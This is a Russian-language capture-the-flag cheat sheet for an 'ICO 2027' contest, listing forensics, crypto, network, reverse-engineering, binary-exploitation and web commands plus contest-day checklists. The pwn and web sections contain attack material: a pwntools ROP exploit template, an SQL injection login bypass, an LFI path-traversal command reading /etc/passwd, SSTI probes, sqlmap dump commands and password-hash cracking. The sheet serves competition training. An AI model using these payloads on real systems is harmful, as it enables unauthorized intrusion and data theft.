# ICO 2027 — ГЛАВНАЯ ШПАРГАЛКА (всё в одном месте)

## ПЕРЕД СТАРТОМ ДНЯ
```bash
sudo systemctl stop ollama 2>/dev/null   # выключить локальный ИИ — на контесте запрещён
# закрыть Gemini, отключить AI-функции в браузере/IDE
```
OBS: Start Recording — ДО того как открываешь платформу с задачей.

---

## ШАГ 0 — на любой новый файл задания
```bash
file F
sha256sum F
xxd -l 128 F                  # заголовок в hex
tail -c 128 F | xxd           # хвост файла
strings -a -n 6 F | grep -Ei 'flag|ico\{|key|pass|token|http'
exiftool F
binwalk F
```
Или разом (если положил скрипт в repo):
```bash
~/ico2027/scripts/auto_triage.sh F
```
Он сам скажет, к какой категории похож файл, и подскажет команды ниже.

---

## FORENSICS
Когда: подозрительный файл, архив, дамп, надо найти скрытое.
```bash
foremost -i F -o carved/              # вытащить встроенные файлы по сигнатурам
binwalk -e F                          # то же самое, другой инструмент, часто находит больше
python3 ~/ico2027/scripts/entropy.py F        # высокая энтропия (~8) = зашифровано/сжато, низкая = обычный текст/код
python3 ~/ico2027/scripts/file_triage.py F    # авто: hash+entropy+strings разом, для быстрого первого взгляда
unzip -l F                            # список файлов в архиве, без распаковки
zip2john F > hash.txt && john hash.txt  # если архив запаролен — вытащить хеш пароля и взломать локальным словарём
python3 ~/ico2027/scripts/png_chunks.py F     # проверка CRC PNG-чанков — если CRC не совпадает, чанк подделан/содержит данные
```

### Дампы памяти (Windows/Linux RAM dump, .raw/.mem/.vmem)
Когда: дали файл дампа оперативной памяти, нужно вытащить процессы/пароли/сетевые соединения.
```bash
python3 ~/ico2027/scripts/vol.py -f F windows.info      # определить профиль/версию ОС
python3 ~/ico2027/scripts/vol.py -f F windows.pslist    # список процессов
python3 ~/ico2027/scripts/vol.py -f F windows.cmdline   # аргументы командной строки процессов
python3 ~/ico2027/scripts/vol.py -f F windows.filescan | grep -i flag   # поиск файлов с "flag" в имени
python3 ~/ico2027/scripts/vol.py -f F windows.netscan   # сетевые соединения на момент дампа
```
(для Linux-дампов — те же плагины с префиксом `linux.` вместо `windows.`)

### Взлом хешей паролей
Когда: есть хеш (MD5/SHA1/NTLM/bcrypt и т.д.), нужно подобрать пароль.
```bash
hashid 'ХЕШ'                                             # определить тип хеша
hashcat -m 0 hash.txt ~/ico2027/wordlists/rockyou.txt     # -m 0 = MD5, подбор по словарю
john --wordlist=~/ico2027/wordlists/rockyou.txt hash.txt  # альтернатива hashcat
```
Номер режима (`-m`) для hashcat меняется под тип хеша — `hashid` подскажет какой.

## STEGO
Когда: картинка/аудио, а в forensics ничего явного не нашлось.
```bash
zsteg F                                       # PNG/BMP — LSB стеганография
python3 ~/ico2027/scripts/lsb_image.py F      # свой LSB-анализатор
sox F -n spectrogram -o spec.png              # звук -> спектрограмма (флаг может быть виден глазами)
ffprobe -hide_banner F                        # метаданные медиа
```

## CRYPTO
Когда: строка/число, текстовый файл с шифротекстом, задача про RSA/LCG/hash.
```bash
python3 ~/ico2027/scripts/base_decode.py F           # base16/32/64/85 разом
python3 ~/ico2027/scripts/xor_singlebyte.py F         # подбор XOR-ключа (авто-ранжирование)
python3 ~/ico2027/scripts/hash_report.py F            # md5/sha1/sha256/sha512
python3 ~/ico2027/scripts/rsa_helpers.py N E C        # факторизация малого RSA-модуля + расшифровка
python3 ~/ico2027/scripts/lcg_solver.py X0 X1 X2      # восстановить a,c генератора по 3 состояниям
python3 ~/ico2027/scripts/lcg_predict.py X A C -n 20  # предсказать следующие 20 значений
python3 -c 'print(pow(A,-1,M))'                       # обратный элемент по модулю
python3 -c 'import sympy; print(sympy.factorint(N))'  # факторизация числа
python3 -c 'from z3 import *; x=Int("x"); s=Solver(); s.add(x>10,x<20); print(s.check(), s.model())'  # система ограничений
```

## NETWORK (pcap-файлы)
Когда: дали .pcap/.pcapng.
```bash
capinfos F                                            # общая сводка
tshark -r F -q -z io,phs                              # какие протоколы вообще есть
tshark -r F -Y dns -T fields -e dns.qry.name | sort -u  # все DNS-запросы
tshark -r F -Y 'http.request'                          # HTTP-запросы
tshark -r F -z follow,tcp,ascii,0                       # содержимое конкретного TCP-потока
tshark -r F -Y tls.handshake                            # TLS handshake
python3 ~/ico2027/scripts/dns_join_decode.py F          # если флаг спрятан по кускам в DNS-метках
python3 ~/ico2027/scripts/pcap_summary.py F             # свод по IP-парам
wireshark F                                             # GUI — если командной строки мало и надо покликать руками
```
Если удобнее визуально: в Wireshark открой файл, `Statistics → Conversations` — те же данные, что `pcap_summary.py`, но глазами.

## REVERSE (бинарник без сети)
Когда: дали ELF/PE, надо понять логику/вытащить константу.
```bash
file BIN
checksec --file=BIN                                   # какие защиты стоят (NX, PIE, canary...)
readelf -h BIN; readelf -S BIN; readelf -s BIN        # заголовок/секции/символы
objdump -d -M intel BIN | less                        # дизасм в Intel-синтаксисе
strings -a BIN | grep -Ei 'flag|secret|admin|win|password|token'
ldd BIN                                               # какие либы подключены
nm -an BIN | grep -Ei 'win|flag|admin'                # подозрительные символы
gdb -q BIN -ex 'set disassembly-flavor intel' -ex 'disassemble main' -ex quit
python3 ~/ico2027/scripts/elf_triage.py BIN           # ELF-сводка в удобном виде
python3 ~/ico2027/scripts/pe_triage.py BIN            # то же для Windows PE
```
Дальше — Ghidra/IDA GUI, если логика сложная и командной строки мало.

## PWN (эксплуатация бинарника, x86_64, обычно есть nc host:port)
Когда: дали бинарник + адрес удалённого сервиса.
```bash
checksec --file=BIN
python3 ~/ico2027/scripts/offset_finder.py --length 500          # сгенерировать cyclic pattern
python3 ~/ico2027/scripts/offset_finder.py --value 0xADDRЕСС     # найти offset по значению из краша
ROPgadget --binary BIN                                # все ROP-гаджеты
ROPgadget --binary BIN | grep -E 'pop rdi|ret'         # конкретно pop rdi; ret
```
Шаблон эксплойта (`pwntools`):
```python
from pwn import *
context.binary = ELF('./chall', checksec=False)
io = process(context.binary.path)      # локально
# io = remote('HOST', PORT)            # на контесте — так
payload = flat({OFFSET: [RET, POP_RDI, ARG, WIN]})
io.sendline(payload)
io.interactive()
```
Format string:
```python
# payload = fmtstr_payload(OFFSET, {TARGET_ADDR: VALUE}, write_size='byte')
```

## WEB
Когда: дали URL веб-приложения.
```bash
curl -skI URL                                         # заголовки ответа
curl -sk URL -o page.html                             # сохранить главную
curl -sk URL/robots.txt
curl -sk URL/sitemap.xml
curl -sk -X OPTIONS URL                                # разрешённые HTTP-методы
ffuf -u URL/FUZZ -w ~/ico2027/wordlists/common.txt -mc 200,301,302,403   # перебор путей
python3 ~/ico2027/scripts/form_parser.py page.html     # разобрать формы из сохранённого HTML
python3 ~/ico2027/scripts/json_paths.py response.json  # пути ключей в JSON (для API)
jq . response.json                                     # красиво отформатировать JSON для чтения глазами
jq '.data.flag' response.json                          # вытащить конкретное поле, если знаешь путь
```
SQLi (только на разрешённый по правилам таргет!):
```bash
curl -sk -X POST URL --data-urlencode "username=' OR 1=1-- -" --data-urlencode 'password=x'
```
Автоматизированный поиск/эксплуатация SQLi (когда ручной payload выше сработал или похоже на SQLi):
```bash
sqlmap -u "URL?id=1" --batch --dbs                    # найти базы данных
sqlmap -u "URL?id=1" --batch -D имя_базы --tables      # таблицы в базе
sqlmap -u "URL?id=1" --batch -D имя_базы -T таблица --dump   # выгрузить данные
sqlmap -u "URL" --data="username=x&password=y" --batch --dbs  # если параметры в POST-теле
```
`--batch` — не задавать интерактивных вопросов, брать значения по умолчанию (важно для скорости на контесте).

Поиск скрытых директорий/файлов на сервере:
```bash
gobuster dir -u URL -w ~/ico2027/wordlists/common.txt -x php,txt,html   # перебор путей + расширений
nikto -h URL                                            # автоматический скан известных уязвимостей/файлов
```

SSTI-пробники в поле ввода: `{{7*7}}` / `${7*7}` / `#{7*7}` — если вернулось "49", есть шаблонная инъекция
LFI: `curl -sk "URL?file=../../../../etc/passwd"`
Работа с локальной базой (если задача даёт .db/.sqlite файл):
```bash
sqlite3 F ".tables"                # список таблиц
sqlite3 F ".dump" | less           # вся структура + данные
sqlite3 F "SELECT * FROM users;"   # прямой запрос
```

---

## Если завис на задаче больше 15 минут
1. Заново `file` + `strings` + метаданные — медленно, глазами.
2. Название задачи/файла часто прямая подсказка (например "lcg" → крипто-блок выше).
3. Сравни размер файла с видимым контентом — что-то может быть спрятано.
4. Проверь все эндпоинты/порты ещё раз.
5. Переключись на другую подзадачу/категорию, вернись позже — время дороже гордости.

---

## КОНЕЦ ДНЯ — обязательный чек-лист
```bash
# 1. Остановить запись в OBS
# 2. Посчитать хеши
sha256sum recording1.mkv recording2.mkv > DIGEST.txt
# 3. Загрузить DIGEST.txt на Google Drive — в течение 30 минут
# 4. Загрузить сами записи — до 22:00 (день1) / 14:30 (день2)
# 5. НЕ трогать DIGEST.txt после отправки — любое изменение после 16:30 аннулирует все записи дня
```
